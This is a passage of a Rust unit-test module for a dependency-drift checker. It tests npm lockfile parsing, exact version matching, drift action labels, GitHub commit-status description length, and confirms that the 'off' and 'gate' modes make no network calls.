        assert_eq!(pinned_from_npm_lock(lock.as_bytes()), None);
    }

    #[test]
    fn non_json_lockfile_is_none() {
        assert_eq!(pinned_from_npm_lock(b"not json at all"), None);
    }

    #[test]
    fn version_compare_is_exact_and_trimmed() {
        assert!(versions_match("1.59.1", "1.59.1"));
        assert!(
            versions_match(" 1.59.1\n", "1.59.1"),
            "whitespace-insensitive"
        );
        assert!(!versions_match("1.59.1", "1.60.0"), "a real bump is drift");
        assert!(!versions_match("1.59.1", "1.59.10"), "no numeric coercion");
    }

    #[test]
    fn action_labels_are_stable() {
        assert_eq!(DriftAction::Surfaced.as_str(), "surfaced");
        assert_eq!(DriftAction::Cleared.as_str(), "cleared");
        assert_eq!(DriftAction::Silent.as_str(), "silent");
        assert_eq!(DriftAction::GateNoop.as_str(), "gate_noop");
        assert_eq!(DriftAction::StatusError.as_str(), "status_error");
    }

    #[test]
    fn heal_description_names_the_pinned_version_and_fits_the_status_limit() {
        let d = heal_description(" 1.62.1\n");
        assert!(d.contains("1.62.1"), "names the version now baked in");
        assert!(
            d.contains("healed"),
            "says what happened, in the codebase's voice"
        );
        // GitHub truncates a commit-status description past 140 chars — see
        // `Github::post_commit_status`'s own doc comment.
        assert!(
            d.len() <= 140,
            "description is {} chars, over GitHub's 140-char limit: {d:?}",
            d.len()
        );
    }

    /// `off` and `gate` must decide without ever dialing GitHub — a heal under
    /// either mode has nothing to clear (see [`act_healed`]'s doc). Bounded by a
    /// short timeout so a regression that starts posting anyway fails fast, as a
    /// timeout, rather than hanging on a network call this sandbox can't make.
    #[tokio::test]
    async fn act_healed_never_posts_under_off_or_gate() {
        let gh = Github::new("test-token".to_string()).expect("client builds");

        let off = tokio::time::timeout(
            std::time::Duration::from_millis(200),
            act_healed(&gh, "acme/widgets", "deadbeef", "1.62.1", DriftMode::Off),
        )
        .await
        .expect("mode = off must not touch the network");
        assert_eq!(off, DriftAction::Silent);

        let gate = tokio::time::timeout(
            std::time::Duration::from_millis(200),
            act_healed(&gh, "acme/widgets", "deadbeef", "1.62.1", DriftMode::Gate),
        )
        .await
        .expect("mode = gate must not touch the network");
        assert_eq!(gate, DriftAction::GateNoop);
    }

    #[test]
    fn configured_no_label_reason_names_both_halves_and_the_fix() {
        // The diagnostic for a half-wired opt-in must point at the missing image
        // label by name (greppable) and say how to fix it (rebuild the image).
        let reason = SkipCause::ConfiguredNoLabel.reason();
        assert!(reason.contains(DRIFT_LABEL), "names the missing label");
        assert!(
            reason.contains(".faber/config.toml"),
            "names the opt-in file"
        );
        assert!(reason.contains("rebuild"), "states the fix");
        // Distinct from the silent common case, so the two never blur in audit.
        assert_ne!(reason, SkipCause::NoLabel.reason());
    }
}
